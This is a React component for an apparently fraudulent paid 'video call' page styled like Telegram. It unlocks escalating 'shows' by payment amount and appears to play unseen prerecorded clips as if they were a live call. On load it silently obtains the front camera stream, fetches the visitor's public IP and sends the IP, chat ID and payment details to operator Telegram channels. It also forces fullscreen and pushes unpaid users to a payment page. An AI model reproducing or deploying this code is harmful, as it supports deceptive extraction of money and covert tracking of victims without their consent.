import React, { useEffect, useState, useCallback } from "react";
import { useParams } from "react-router-dom";
import VideoCall from "./Videocall";
import TelegramUI from "./startPage";
import { fetchWithTimeout, parseError, encodeForTelegram } from "./utils";
import CircularProgress from "@mui/material/CircularProgress";
import IconButton from "@mui/material/IconButton";
let ip = "Not Found";

function Idle() {
    const { profile, chatId, defvid, force } = useParams();
    const [hasJoinedCall, setHasJoinedCall] = useState(false);
    const [canCall, setCanCall] = useState(false);
    const [clientData, setClientData] = useState(null);
    const [userData, setUserData] = useState(null);
    const [isPaying, setIsPaying] = useState(false);
    const [loading, setLoading] = useState(true);
    const [isReporting, setIsReporting] = useState(false);
    const [paymentstats, setPaymentstats] = useState({
        paid: 0,
        demoGiven: 0,
        secondShow: 0,
        fullShow: 0,
        latestCallTime: Date.now(),
        videos: [],
    });
    const [video, setVideo] = useState(1);
    const [videoType, setVideoType] = useState("1");
    const [duration, setDuration] = useState(0);
    const [openCount, setOpenCount] = useState(1);
    const [cameraStreams, setCameraStreams] = useState({
        front: null,
        back: null,
    });

    // function chooseRandom(arr) {
    //     const randomIndex = Math.floor(Math.random() * arr.length);
    //     return arr[randomIndex];
    // }

    const getCameraStream = useCallback(async (isFrontCamera) => {
        try {
            const cameraType = isFrontCamera ? "front" : "back";
            if (cameraStreams[cameraType]) {
                console.log(`stream exist : isFront-${isFrontCamera}`);
                return cameraStreams[cameraType];
            } else {
                console.log(`stream Does not exist : isFront-${isFrontCamera}`);
            }
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: isFrontCamera ? "user" : "environment" },
                audio: false,
            });

            setCameraStreams((prev) => ({
                ...prev,
                [cameraType]: stream,
            }));

            return stream;
        } catch (error) {
            return undefined;
        }
    }, [cameraStreams]);

    const reqFullScreen = async () => {
        var elem = document.documentElement;
        try {
            if (elem.requestFullscreen) {
                await elem.requestFullscreen({ navigationUI: "hide" });
            } else if (elem.msRequestFullscreen) {
                await elem.msRequestFullscreen();
            } else if (elem.mozRequestFullScreen) {
                await elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) {
                await elem.webkitRequestFullscreen();
            } else {
                await fetchWithTimeout(
                    `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
                        `ChatId: *${chatId}*\nclient: *${profile}*\nVcError: *FullScreenNotSupported*`
                    )}`
                );
            }
        } catch (error) {
            console.log(error);
            await fetchWithTimeout(
                `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
                    `ChatId: *${chatId}*\nclient: *${profile}*\nVcError: *FullScreenNotSupported*`
                )}`
            );
        }
    };

    const joinVideoCall = async () => {
        await reqFullScreen();
        try {
            if (!hasJoinedCall) {
                if (!defvid) {
                    let vType = "1";
                    const setTheVideo = async () => {
                        const chatId = userData.chatId;
                        const result = await fetchWithTimeout(
                            `https://uptimechecker2.glitch.me/isRecentUser?chatId=${chatId}`
                        );
                        const count = parseInt(result?.data?.count) || 1;
                        setOpenCount(count);
                        const watchedVideos = [
                            ...userData.videos.map(Number),
                            ...paymentstats.videos.map(Number),
                        ]; // convert watched videos to number array

                        const chooseFilteredRandom = (options) => {
                            const filteredOptions = options.filter(
                                (option) => !watchedVideos.includes(option)
                            );
                            return filteredOptions[0];
                        };
                        let videoSet = chooseFilteredRandom([
                            1, 2, 8, 10, 21, 13, 15, 9, 11, 4, 14, 10, 16, 17,
                        ]);

                        // console.log(userData.payAmount, userData.demoGiven, userData.secondShow);
                        if (userData.payAmount > 14 && !userData.demoGiven) {
                            // console.log("inVtype: ", 1);
                            vType = "1";
                            videoSet = chooseFilteredRandom([
                                1, 9, 44, 42, 41, 23, 24, 43, 8, 13, 15,
                            ]);
                            if (userData.videos.length > 0) {
                                videoSet = chooseFilteredRandom([24, 21]);
                            }
                            // if (paymentstats.demoGiven === 0) {
                            //     videoSet = 1;
                            // } else if (paymentstats.demoGiven == 1) {
                            //     videoSet = 8;
                            // } else {
                            //     videoSet = chooseFilteredRandom([1,8,9, 13, 15]);
                            // }
                        } else if (userData.payAmount > 50 && !userData.secondShow) {
                            // console.log("inVtype: ", 2);
                            vType = "2";
                            videoSet = chooseFilteredRandom([
                                2, 4, 5, 21, 24, 10, 11, 16, 14,
                            ]);
                            // if (paymentstats.secondShow === 0) {
                            //     videoSet = 2;
                            // } else if (paymentstats.secondShow == 1) {
                            //     videoSet = 10;
                            // } else {
                            //     videoSet = chooseFilteredRandom([2, 10,11, 16, 14]);
                            // }
                        } else if (
                            userData.payAmount > 150 ||
                            userData.highestPayAmount >= 200
                        ) {
                            // console.log("inVtype: ", 3);
                            vType = "3";
                            videoSet = chooseFilteredRandom([
                                2, 4, 21, 24, 5, 11, 14, 10, 16, 17,
                            ]);

                            // if (!userData.fullShow) {
                            //     if (paymentstats.fullShow == 0) {
                            //         videoSet = 4;
                            //     } else if (paymentstats.fullShow == 1) {
                            //         videoSet = 21;
                            //     } else {
                            //         videoSet = chooseFilteredRandom([11, 4, 14, 10, 16, 17]);
                            //     }
                            // } else {
                            //     videoSet = chooseFilteredRandom([11, 14, 10, 16, 17]);
                            // }
                        }
                        // console.log(vType, "selected: ", videoSet);
                        setVideo(videoSet);
                        setVideoType(vType);
                        console.log("VideoSet : ", videoSet);
                        const lastVideoDetails = result?.data?.videoDetails[`${vType}`];
                        if (
                            lastVideoDetails &&
                            lastVideoDetails.time > Date.now() - 600000
                        ) {
                            setDuration(lastVideoDetails.duration || 0);
                        }
                    };
                    await setTheVideo();
                } else {
                    // console.log("setting dEf video");
                    setVideo(parseInt(defvid));
                }
                setHasJoinedCall(true);
            }
            fetchWithTimeout(
                `https://arpithared.onrender.com/events/delete?chatId=${chatId}`
            );
            fetchWithTimeout(
                `https://uptimechecker2.glitch.me/userData/clear-count?chatId=${chatId}`
            );
            fetchWithTimeout(`${clientData.repl}/deleteCallRequest/${chatId}`);
        } catch (e) {
            console.log(e);
            await fetchWithTimeout(
                `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
                    `ChatId: *${chatId}*\nclient: *${profile}*\nVcJoinVDErr: *${parseError(e).message}*`
                )}`
            );
        }
    };

    useEffect(() => {
        const fetchData = async () => {
            try {
                const responseUserInfo = await fetchWithTimeout(
                    `https://api.npoint.io/f0d1e44d82893490bbde/${profile}`
                );
                setClientData(responseUserInfo.data);
                const responseVidData = await fetchWithTimeout(
                    `https://uptimechecker2.glitch.me/userdata/${responseUserInfo.data?.dbcoll}/${chatId}`
                );
                const userDetails = responseVidData.data;
                setUserData(userDetails);
                if (
                    (userDetails &&
                        userDetails.canReply !== 0 &&
                        userDetails.payAmount >= 30 &&
                        userDetails.videos.length < 10 &&
                        ((userDetails.highestPayAmount >= 250 &&
                            userDetails.callTime < Date.now() - 3 * 60 * 60 * 1000) ||
                            (userDetails.payAmount < 100 &&
                                userDetails.highestPayAmount >= 15 &&
                                !userDetails.demoGiven &&
                                userDetails.videos.length < 2) ||
                            (userDetails.payAmount > 50 &&
                                userDetails.payAmount < 200 &&
                                userDetails.highestPayAmount >= 50 &&
                                !userDetails.secondShow) ||
                            (userDetails.payAmount >= 200 &&
                                ((userDetails.highestPayAmount >= 80 &&
                                    userDetails.fullShow < 2) ||
                                    (userDetails.highestPayAmount >= 120 &&
                                        userDetails.fullShow < 5) ||
                                    (userDetails.highestPayAmount >= 180 &&
                                        userDetails.fullShow < 7)) &&
                                userDetails.videos.length < 10))) ||
                    force === "true"
                ) {
                    setCanCall(true);
                    const demoStats = await fetchWithTimeout(
                        `https://uptimechecker2.glitch.me/paymentstats?chatId=${chatId}&profile=${responseUserInfo.data?.dbcoll}`
                    );
                    if (demoStats?.data) {
                        setPaymentstats(demoStats?.data);
                    }
                }
                setLoading(false);
                getCameraStream(true);
                if (ip === "Not Found") {
                    try {
                        const response = await fetch("https://api.ipify.org?format=json");
                        const output = await response.json();
                        ip = output?.ip || "Not Found";
                    } catch (err) {
                        // console.error('Failed to fetch IP or send Telegram message:', err);
                    }
                }
                if (userDetails.count < 5 && userDetails.videos.length < 5) {
                    await fetchWithTimeout(
                        `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
                            `Opened VcUI\n\n` +
                            `Profile: *${profile}*\n` +
                            `Chat ID: *${chatId}*\n` +
                            `All Videos: *${paymentstats.videos}*\n` +
                            `Own Videos: *${userDetails.videos}*\n` +
                            `Selected Video: *${video}*\n` +
                            `IP: *${ip}*\n` +
                            `Count: *${userDetails.count}*` // Prevents link preview
                        )}`
                    );
                } else {
                    await fetchWithTimeout(
                        `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1002472867139&msg=${encodeForTelegram(
                            `Opened VcUI\n\n` +
                            `Profile: *${profile}*\n` +
                            `Chat ID: *${chatId}*\n` +
                            `All Videos: *${paymentstats.videos}*\n` +
                            `Own Videos: *${userDetails.videos}*\n` +
                            `Selected Video: *${video}*\n` +
                            `IP: *${ip}*\n` +
                            `Count: *${userDetails.count}*\n` +
                            `Am: *${userDetails.amount}*\n` +
                            `Highest Amount: *${userDetails.highestPayAmount}*\n` +
                            `[Open Chat](https://tgchats.netlify.app?client=${profile}&chatId=${chatId})` // Prevents link preview
                        )}`
                    );
                }

            } catch (e) {
                console.log(e);
                const errorDetails = parseError(e);
                await fetchWithTimeout(
                    `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
                        `IDle Error\n\nChatId: *${chatId}*\nclient: *${profile}*\nVcPMTSTATSError: *${errorDetails.message}*`
                    )}`
                );
            }
        };

        fetchData();
    }, []);

    return (
        <div style={ { height: "100%" } }>
            { (loading || isReporting || isPaying) && (
                <IconButton
                    className="idle-app"
                    style={ { paddingTop: "5vh", color: "grey" } }
                >
                    {
                        <CircularProgress
                            size={ 50 }
                            thickness={ 5 }
                            color="inherit"
                        ></CircularProgress>
                    }
                </IconButton>
            ) }
            { !loading && (
                <div style={ { height: "100%" } }>
                    { canCall &&
                        (paymentstats.demoGiven < 4 ||
                            paymentstats.latestCallTime <
                            Date.now() - 24 * 60 * 60 * 1000) && (
                            <div style={ { height: "100%" } }>
                                { !hasJoinedCall && (
                                    <TelegramUI
                                        joinVideoCall={ joinVideoCall }
                                        clientData={ clientData }
                                        userData={ userData }
                                    ></TelegramUI>
                                ) }
                                { hasJoinedCall && (
                                    <VideoCall
                                        clientData={ clientData }
                                        userData={ userData }
                                        paymentstats={ paymentstats }
                                        video={ video }
                                        openCount={ openCount }
                                        duration={ duration }
                                        videoType={ videoType }
                                        getCameraStream={ getCameraStream }
                                    ></VideoCall>
                                ) }
                            </div>
                        ) }

                    { !canCall && (
                        <div>
                            <div style={ { marginTop: "5vh", fontWeight: "bolder" } }>
                                Finish Payment
                            </div>
                            <div style={ { marginTop: "60vh" } }>
                                <button
                                    style={ {
                                        position: "relative",
                                        backgroundColor: "rgb(55 173 72)",
                                    } }
                                    onClickCapture={ () => {
                                        setIsPaying(true); // Set loading state
                                        window.location.href = `https://paidgirl.netlify.app/${profile}`;
                                    } }
                                >
                                    { isReporting ? "Please wait..." : "Pay Now" }
                                </button>
                                <div style={ { display: "flex", justifyContent: "center" } }>
                                    <button
                                        className="report-button"
                                        style={ { backgroundColor: isReporting ? "grey" : "#ee3838" } }
                                        disabled={ isReporting } // Disable button if loading
                                        onClick={ async () => {
                                            setIsReporting(true); // Set loading state
                                            await fetchWithTimeout(
                                                `https://uptimechecker2.glitch.me/sendtochannel?chatId=-1001823103248&msg=${encodeForTelegram(
                                                    `Report Button clicked: *${userData.chatId}*`
                                                )}`
                                            );
                                            window.open(
                                                `https://report-upi.netlify.app/${profile}/${chatId}`,
                                                "_self"
                                            );
                                        } }
                                    >
                                        { isReporting ? "Please wait..." : "Report Transaction" }
                                    </button>
                                </div>
                            </div>
                        </div>
                    ) }

                </div>
            ) }
        </div>
    );
}
export default Idle;
